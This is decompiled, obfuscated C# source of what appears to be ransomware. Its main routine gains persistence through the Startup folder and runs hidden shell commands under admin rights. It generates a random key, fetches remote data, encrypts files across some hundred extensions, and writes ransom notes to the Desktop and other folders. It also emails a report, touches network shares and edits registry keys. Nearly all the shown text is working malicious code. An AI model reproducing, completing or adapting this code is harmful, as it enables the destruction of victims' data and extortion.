	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate14;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate15;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate16;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		try
		{
			PblFtmDLYqge CS_0024_003C_003E8__locals0 = new PblFtmDLYqge();
			CS_0024_003C_003E8__locals0.JbAiLkhAACkimV = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.JbAiLkhAACkimV) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			qqeMXZJeSBH.djVBndqvWBQybZ(eocHXBFcoPc);
		}
		catch (Exception)
		{
		}
		try
		{
			if (hjNsvgTUNea == getString_0(107396964))
			{
				Thread thread = new Thread(OlSbUPygXGkh.WKKaxbBdadR);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (OtVbJHwGpAtFQyT == getString_0(107396964))
		{
			Thread.Sleep(int.Parse(NCJlttEOSHQg));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && NQyfkhkCAdHiBh == getString_0(107396964))
		{
			try
			{
				hyIIljcpYEblLtxV(hNmpLWayyKYy(getString_0(107396959)));
			}
			catch
			{
			}
		}
		if (uccGqOrrMM == getString_0(107396964))
		{
			KIZCPcnPkivoQ.pKhXdLzcGVGv();
		}
		try
		{
			if (ISWgsPSKHYk == getString_0(107396964) && oKhLgVEbgFZBbZL.cCSeYvTLoFdHW())
			{
				new TuehKGaxKRoptUmJ().HZUqiVpDiYc(bool_0: false);
				oKhLgVEbgFZBbZL.LGhQzsYLZzBXosXZf();
			}
		}
		catch (Exception)
		{
		}
		if (FgAipgzSjMdCQgJ == getString_0(107396964) && oKhLgVEbgFZBbZL.cCSeYvTLoFdHW())
		{
			new TuehKGaxKRoptUmJ().HZUqiVpDiYc(bool_0: false);
			new TuehKGaxKRoptUmJ().gyShNpOHOyS();
		}
		if (MfkjGXKhxyhehv == getString_0(107396964))
		{
			UYGDxQQaDX.pSnzMWATwkZgcy();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107396822);
			string text2 = text + Path.GetFileName(fileName);
			if (tjbwkkqjGcTNHLS == getString_0(107396964) && fileName != text2)
			{
				Thread thread2 = new Thread(xNDUtkMZkuQWBXV);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (CocLCSEHmD == getString_0(107396964) && mainModule != null && fileName != text2)
			{
				try
				{
					iZKhurDDLnidT = JoRPMgOQXWlnYrJG(0, XJrcacgShCStzR.Count);
					File.Copy(fileName, text + XJrcacgShCStzR[iZKhurDDLnidT], overwrite: true);
					Process.Start(text + XJrcacgShCStzR[iZKhurDDLnidT]);
					GYLxswafJgK();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (MHekRYDPgvS == getString_0(107396964) && DateTime.Now < FhoQZCuugw)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (wZVDIOgHreaG == getString_0(107396964) && DateTime.Now > cnzOdaYThekPAqQfq)
			{
				GYLxswafJgK();
			}
		}
		catch
		{
		}
		glPlTUDxsyCftd();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegated == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegated = delegate
			{
				List<string> source = tlnCIdpwTu;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
					{
						WMwWOqjOFtUT(getString_0(107389707), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				List<string> source2 = oqctRyBSIQ;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
					{
						WMwWOqjOFtUT(getString_0(107392704), string_0);
					};
				}
				Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				List<string> ylTzmyhpiwknfhq = YlTzmyhpiwknfhq;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						WMwWOqjOFtUT(hNmpLWayyKYy(getString_0(107389730)), string_0);
					};
				}
				Parallel.ForEach(ylTzmyhpiwknfhq, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				if (kskmTAbTAdUwgF == getString_0(107396964))
				{
					string[] source3 = fgyftAvJczBLO;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
						{
							WMwWOqjOFtUT(hNmpLWayyKYy(getString_0(107389730)), getString_0(107389673) + string_0 + getString_0(107389696));
						};
					}
					Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
				}
				if (!qalydKPwEW().Contains(getString_0(107390431)))
				{
					fgwTRLutHHin(FYfkyKTYUeI);
				}
				else
				{
					List<string> source4 = zDTTWfcIAya;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
						{
							WMwWOqjOFtUT(hNmpLWayyKYy(ouaHPvfKVdnz(getString_0(107389691))), string_0);
						};
					}
					Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
				}
				List<string> source5 = rUYXUMGWrLAx;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
					{
						WMwWOqjOFtUT(hNmpLWayyKYy(getString_0(107389666)), string_0);
					};
				}
				Parallel.ForEach(source5, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
				List<string> source6 = tmofVFVJKbRY;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
					{
						WMwWOqjOFtUT(getString_0(107389617), string_0);
					};
				}
				Parallel.ForEach(source6, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegated);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && jlfnbBYuNDzI)
			{
				try
				{
					Thread thread4 = new Thread(eBvBjzDrSadgKm.elsdDIOXQDDCc);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			WMwWOqjOFtUT(getString_0(107396817), hNmpLWayyKYy(getString_0(107396836)));
			WMwWOqjOFtUT(getString_0(107396817), hNmpLWayyKYy(getString_0(107396763)));
			WMwWOqjOFtUT(hNmpLWayyKYy(getString_0(107397218)), hNmpLWayyKYy(getString_0(107397173)));
			WMwWOqjOFtUT(hNmpLWayyKYy(getString_0(107397218)), hNmpLWayyKYy(getString_0(107397043)));
		}
		SecureString secureString = new SecureString();
		if (GyjdlyjfcEOXI == getString_0(107396421))
		{
			Random random = new Random();
			for (int i = 0; i < 32; i++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					i--;
				}
			}
		}
		else
		{
			cGVxFqKPccB = getString_0(107396416);
		}
		vaOvGgHCInLEo = NkovHMVDww.EAiaLHGuShXIai(FRmjPpuIyZEEH(secureString));
		if (GvXCAEeKPgvgux)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), SXVCtbaEWR)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), SXVCtbaEWR), string.Concat(hNmpLWayyKYy(getString_0(107396339)), new WebClient().DownloadString(hNmpLWayyKYy(getString_0(107396346))), getString_0(107396273), hNmpLWayyKYy(getString_0(107396268)), DateTime.Now, getString_0(107396273), hNmpLWayyKYy(getString_0(107396259)), vaOvGgHCInLEo));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), SXVCtbaEWR), getString_0(107396682) + vaOvGgHCInLEo);
				}
			}
			catch (Exception ex7)
			{
				if (keaHDdagjiDMCTfH)
				{
					try
					{
						File.AppendAllText(RztYwSIsnQJzs, getString_0(107396653) + ex7.Message + getString_0(107396273));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		MCrgRxsrJGxI.SoAEVnAkTLhlc(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), tHmQYSpikTiuXUcp), bXKCqhMTSyKC(vaOvGgHCInLEo), null, null, getString_0(107396636), getString_0(107396587), null);
		if (tzUVFfNhnxlV == getString_0(107396964))
		{
			try
			{
				BQTNpepJPHT();
			}
			catch
			{
			}
		}
		try
		{
			SZjoOjixXJ(new string[1] { getString_0(107396602) }, new string[100]
			{
				getString_0(107396561),
				getString_0(107396556),
				getString_0(107396583),
				getString_0(107396574),
				getString_0(107396569),
				getString_0(107396532),
				getString_0(107396527),
				getString_0(107396522),
				getString_0(107396549),
				getString_0(107396544),
				getString_0(107396539),
				getString_0(107396502),
				getString_0(107396493),
				getString_0(107396520),
				getString_0(107396511),
				getString_0(107396506),
				getString_0(107396469),
				getString_0(107396464),
				getString_0(107396459),
				getString_0(107396486),
				getString_0(107396477),
				getString_0(107395928),
				getString_0(107395923),
				getString_0(107395918),
				getString_0(107395913),
				getString_0(107395940),
				getString_0(107395935),
				getString_0(107395930),
				getString_0(107395893),
				getString_0(107395888),
				getString_0(107395883),
				getString_0(107395910),
				getString_0(107395905),
				getString_0(107395900),
				getString_0(107395859),
				getString_0(107395854),
				getString_0(107395849),
				getString_0(107395876),
				getString_0(107396527),
				getString_0(107395871),
				getString_0(107396549),
				getString_0(107395830),
				getString_0(107395825),
				getString_0(107395820),
				getString_0(107395847),
				getString_0(107395842),
				getString_0(107395837),
				getString_0(107395800),
				getString_0(107395795),
				getString_0(107395790),
				getString_0(107395785),
				getString_0(107395812),
				getString_0(107395807),
				getString_0(107395802),
				getString_0(107395765),
				getString_0(107395760),
				getString_0(107395755),
				getString_0(107395782),
				getString_0(107395773),
				getString_0(107395736),
				getString_0(107395727),
				getString_0(107395746),
				getString_0(107395871),
				getString_0(107395701),
				getString_0(107395692),
				getString_0(107395715),
				getString_0(107395706),
				getString_0(107396177),
				getString_0(107396200),
				getString_0(107396195),
				getString_0(107396186),
				getString_0(107396145),
				getString_0(107396168),
				getString_0(107396163),
				getString_0(107396158),
				getString_0(107396153),
				getString_0(107396116),
				getString_0(107396111),
				getString_0(107396106),
				getString_0(107396129),
				getString_0(107396124),
				getString_0(107396087),
				getString_0(107396082),
				getString_0(107396077),
				getString_0(107396104),
				getString_0(107396095),
				getString_0(107396054),
				getString_0(107396049),
				getString_0(107395905),
				getString_0(107396044),
				getString_0(107396071),
				getString_0(107396066),
				getString_0(107396061),
				getString_0(107396024),
				getString_0(107396015),
				getString_0(107396010),
				getString_0(107396037),
				getString_0(107396028),
				getString_0(107395991),
				getString_0(107395986)
			}, new string[0], FRmjPpuIyZEEH(secureString), getString_0(107395981));
		}
		catch (Exception ex9)
		{
			if (keaHDdagjiDMCTfH)
			{
				try
				{
					File.AppendAllText(RztYwSIsnQJzs, getString_0(107396000) + ex9.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395975)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395975));
				streamWriter.WriteLine(hNmpLWayyKYy(getString_0(107395430)));
				streamWriter.WriteLine(getString_0(107396273));
				streamWriter.WriteLine(hNmpLWayyKYy(getString_0(107394500)));
				streamWriter.WriteLine(vaOvGgHCInLEo);
				if (htNfweWWpfJ == getString_0(107396421))
				{
					streamWriter.WriteLine(getString_0(107396273));
					streamWriter.WriteLine(hNmpLWayyKYy(getString_0(107394467)) + Convert.ToString(yjAazhPgxhDIu.Count));
				}
			}
			else
			{
				File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395975), getString_0(107393846) + vaOvGgHCInLEo);
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in hxATskUeUhTwX)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395975)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395975), item + getString_0(107395975), overwrite: true);
				}
				else
				{
					File.AppendAllText(item + getString_0(107395975), getString_0(107393846) + vaOvGgHCInLEo);
				}
			}
			catch (Exception)
			{
			}
			if (!IhOmrQOWDLAAWCMJa && num > 10)
			{
				break;
			}
		}
		if (jUSGzoxzYrHnqV == getString_0(107396964))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393849)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393849));
					streamWriter2.WriteLine(hNmpLWayyKYy(getString_0(107393784)));
					streamWriter2.WriteLine(getString_0(107396273));
					streamWriter2.WriteLine(hNmpLWayyKYy(getString_0(107393799)));
					streamWriter2.WriteLine(vaOvGgHCInLEo + hNmpLWayyKYy(getString_0(107393678)));
					if (htNfweWWpfJ == getString_0(107396421))
					{
						streamWriter2.WriteLine(getString_0(107396273));
						streamWriter2.WriteLine(hNmpLWayyKYy(getString_0(107393697)) + hNmpLWayyKYy(getString_0(107394467)) + Convert.ToString(yjAazhPgxhDIu.Count) + hNmpLWayyKYy(getString_0(107393678)));
					}
				}
				else
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393849), hNmpLWayyKYy(getString_0(107393697)) + getString_0(107393846) + vaOvGgHCInLEo + hNmpLWayyKYy(getString_0(107393678)));
				}
			}
			catch
			{
			}
		}
		if (xOOdbsMOOZj == getString_0(107396964))
		{
			try
			{
				if (htNfweWWpfJ == getString_0(107396421))
				{
					TvsCtQOAQyGAc.rTwukiUzIroUsZI(getString_0(107394148), getString_0(107394143), getString_0(107394098), string.Concat(hNmpLWayyKYy(getString_0(107396339)), new WebClient().DownloadString(hNmpLWayyKYy(getString_0(107396346))), getString_0(107394089), hNmpLWayyKYy(getString_0(107396268)), DateTime.Now, getString_0(107396273), hNmpLWayyKYy(getString_0(107394116)), Convert.ToString(yjAazhPgxhDIu.Count), getString_0(107396273), hNmpLWayyKYy(getString_0(107396259)), vaOvGgHCInLEo));
				}
				else
				{
					TvsCtQOAQyGAc.rTwukiUzIroUsZI(getString_0(107394148), getString_0(107394143), getString_0(107394098), string.Concat(hNmpLWayyKYy(getString_0(107396339)), new WebClient().DownloadString(hNmpLWayyKYy(getString_0(107396346))), getString_0(107394089), hNmpLWayyKYy(getString_0(107396268)), DateTime.Now, getString_0(107396273), hNmpLWayyKYy(getString_0(107394116)), Convert.ToString(yjAazhPgxhDIu.Count), getString_0(107396273), hNmpLWayyKYy(getString_0(107396259)), vaOvGgHCInLEo));
				}
			}
			catch
			{
			}
		}
		if (MgOyEjlOtOFzUj == getString_0(107396964))
		{
			try
			{
				HtHyxkIwWov.DsJWxdLDRJNvUC(new Uri(getString_0(107394035)));
			}
			catch
			{
			}
		}
		if (jUSGzoxzYrHnqV == getString_0(107396421))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395975)))
				{
					Process.Start(hNmpLWayyKYy(getString_0(107394034)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395975));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393849)))
				{
					Process.Start(hNmpLWayyKYy(getString_0(107394041)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393849));
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(ZUmpRuBwYbxQ))
		{
			try
			{
				File.Delete(ZUmpRuBwYbxQ);
			}
			catch
			{
			}
		}
		if (keaHDdagjiDMCTfH)
		{
			try
			{
				File.AppendAllText(RztYwSIsnQJzs, getString_0(107394024));
			}
			catch (Exception)
			{
			}
		}
		if (HepjTqUkLVyB == getString_0(107394011))
		{
			GYLxswafJgK();
		}
	}

	public static void xNDUtkMZkuQWBXV()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(hNmpLWayyKYy(getString_0(107393970)), hNmpLWayyKYy(getString_0(107393304)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int JoRPMgOQXWlnYrJG(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> aBOgOmLiYavG(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.ToLower().Contains(getString_0(107393319)) && !text.ToLower().Contains(getString_0(107393266)) && !text.ToLower().Contains(getString_0(107393285)) && !text.ToLower().Contains(getString_0(107393240)) && !text.ToLower().Contains(getString_0(107393247)) && !text.ToLower().Contains(getString_0(107393194)) && !text.ToLower().Contains(getString_0(107393213)) && !text.ToLower().Contains(getString_0(107393168)) && !text.ToLower().Contains(getString_0(107393131)) && !text.ToLower().Contains(getString_0(107393154)) && !text.ToLower().Contains(getString_0(107393617)) && !text.ToLower().Contains(getString_0(107393194)) && !text.ToLower().Contains(getString_0(107393636)) && !text.ToLower().Contains(getString_0(107393583)))
				{
					array = Directory.GetFiles(text);
					goto IL_01eb;
				}
			}
			catch
			{
			}
			continue;
			IL_01eb:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107393558)) && !fileInfo.FullName.Contains(getString_0(107393573)) && !fileInfo.FullName.Contains(getString_0(107393524)) && !fileInfo.FullName.Contains(getString_0(107393539)) && !fileInfo.FullName.Contains(getString_0(107393490)) && !fileInfo.FullName.Contains(getString_0(107393505)) && !fileInfo.FullName.Contains(getString_0(107393456)) && !fileInfo.FullName.Contains(getString_0(107393471)) && !fileInfo.FullName.Contains(getString_0(107393426)) && !fileInfo.FullName.Contains(getString_0(107393437)) && !fileInfo.FullName.ToLower().Contains(getString_0(107393392)) && !fileInfo.FullName.ToLower().Contains(getString_0(107393411)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392850)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392865)) && !fileInfo.FullName.Contains(hNmpLWayyKYy(getString_0(107392816))) && !fileInfo.FullName.Contains(getString_0(107392791)) && !fileInfo.FullName.Contains(getString_0(107392778)) && !fileInfo.FullName.EndsWith(getString_0(107395981)) && !fileInfo.FullName.EndsWith(getString_0(107392753)) && !fileInfo.FullName.EndsWith(getString_0(107392748)) && !fileInfo.FullName.EndsWith(getString_0(107392775)) && !fileInfo.FullName.EndsWith(getString_0(107392770)) && !fileInfo.FullName.Contains(getString_0(107392765)) && !fileInfo.FullName.Contains(tHmQYSpikTiuXUcp) && !fileInfo.FullName.Contains(RztYwSIsnQJzs) && !fileInfo.FullName.Contains(SXVCtbaEWR))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(nnhqbergWhMClf) * 1024.0 * 1024.0 && xUGtSzShmupOk == getString_0(107396964))
						{
							list.Add(fileInfo.FullName);
							YybwhxQIQLrI(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && xUGtSzShmupOk == getString_0(107396421))
						{
							list.Add(fileInfo.FullName);
							YybwhxQIQLrI(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static string WMwWOqjOFtUT(string hFpTjtpbhnsyty = "", string fMKVFVZdUcws = "")
	{
		string result = getString_0(107394035);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = hFpTjtpbhnsyty,
				Arguments = fMKVFVZdUcws,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void hyIIljcpYEblLtxV(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107392716),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string ouaHPvfKVdnz(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string hNmpLWayyKYy(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	private static void BQTNpepJPHT()
	{
		//IL_05b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_05b8: Expected O, but got Unknown
		//IL_05d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_05da: Expected O, but got Unknown
		fOzgPUZOHdrgRF.tpIfPYJYywgK();
		FXXItJkGMyTzK = fOzgPUZOHdrgRF.efuPlbNlEmCBzbN();
		List<KmnWJRKqQLuU> list = KmnWJRKqQLuU.BtqrAQhPtWSj();
		foreach (KmnWJRKqQLuU item in list)
		{
			XugKJAihpC.Add(item.IPAddress);
		}
		zfFucxqmGOlbbp = FXXItJkGMyTzK.Union(XugKJAihpC).ToList();
		foreach (string item2 in zfFucxqmGOlbbp)
		{
			if ((!item2.StartsWith(getString_0(107392731)) && !item2.StartsWith(getString_0(107392694)) && !item2.StartsWith(getString_0(107392685)) && !item2.StartsWith(getString_0(107394035))) || !fOzgPUZOHdrgRF.LiQOxkHwXyG(item2))
			{
				continue;
			}
			try
			{
				if (yxYUzXQcSUSLG == getString_0(107396964))
				{
					for (int i = 0; i < fOzgPUZOHdrgRF.gfZxCuwEwMVj.Count; i++)
					{
						WMwWOqjOFtUT(getString_0(107392704), getString_0(107392659) + item2 + getString_0(107392650) + fOzgPUZOHdrgRF.gfZxCuwEwMVj[i] + getString_0(107392669) + fOzgPUZOHdrgRF.bIbSxypvfDIpF[i]);
					}
				}
				else
				{
					WMwWOqjOFtUT(getString_0(107392704), getString_0(107392659) + item2);
				}
			}
			catch
			{
			}
		}
		try
		{
			fOzgPUZOHdrgRF.bnNMxgQjQjAgfbs bnNMxgQjQjAgfbs = new fOzgPUZOHdrgRF.bnNMxgQjQjAgfbs(fOzgPUZOHdrgRF.wRBgihOxpvULNjvq.TqAYSZkjjlz, fOzgPUZOHdrgRF.ACNKVrmUfDJaw.OmfqhAhtGZkQkL, fOzgPUZOHdrgRF.QDUQgHFedcjQ.ZjBTaMkyRWbVT, fOzgPUZOHdrgRF.fwxKaIxzvINOwOIK.KUpaccwTiLmC);
			foreach (string item3 in bnNMxgQjQjAgfbs)
			{
				MatchCollection matchCollection = Regex.Matches(item3, getString_0(107392632));
				foreach (Match item4 in matchCollection)
				{
					try
					{
						if (yxYUzXQcSUSLG == getString_0(107396964))
						{
							for (int j = 0; j < fOzgPUZOHdrgRF.gfZxCuwEwMVj.Count; j++)
							{
								WMwWOqjOFtUT(getString_0(107392704), getString_0(107393095) + item4.ToString() + getString_0(107392650) + fOzgPUZOHdrgRF.gfZxCuwEwMVj[j] + getString_0(107392669) + fOzgPUZOHdrgRF.bIbSxypvfDIpF[j]);
							}
						}
						else
						{
							WMwWOqjOFtUT(getString_0(107392704), getString_0(107393095) + item4.ToString());
						}
					}
					catch
					{
					}
					if (!tkcHcCnvalC.Contains(item4.ToString()))
					{
						tkcHcCnvalC.Add(item4.ToString());
					}
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string string_ = ouaHPvfKVdnz(getString_0(107393086));
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(hNmpLWayyKYy(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(hNmpLWayyKYy(getString_0(107392949)), 1, RegistryValueKind.DWord);
					registryKey.SetValue(hNmpLWayyKYy(getString_0(107392924)), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (JLxpvIZTQHDy == getString_0(107396964))
		{
			try
			{
				string text = Path.GetTempFileName().Replace(getString_0(107392335), getString_0(107392358));
				File.WriteAllText(text, hNmpLWayyKYy(getString_0(107392349)), Encoding.ASCII);
				WMwWOqjOFtUT(getString_0(107396817), getString_0(107391263) + text);
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107391258))))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107391258)));
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107391217))))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107391217)));
				}
			}
			catch
			{
			}
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107391240));
		ManagementObjectEnumerator enumerator5 = val.Get().GetEnumerator();
		try
		{
			while (enumerator5.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator5.get_Current();
				if (!tkcHcCnvalC.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107391155), getString_0(107396822)).Replace(getString_0(107391150), getString_0(107391155))
					.Replace(getString_0(107391173), getString_0(107394035))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					tkcHcCnvalC.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107391155), getString_0(107396822)).Replace(getString_0(107391150), getString_0(107391155))
						.Replace(getString_0(107391173), getString_0(107394035))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107391168), getString_0(107394035)) + getString_0(107391127));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator5)?.Dispose();
		}
	}

	public static void fgwTRLutHHin(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = hNmpLWayyKYy(getString_0(107391118));
		processStartInfo.Arguments = getString_0(107391089) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool bUXhgPibIRSr(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string FRmjPpuIyZEEH(SecureString secureString_0)
	{
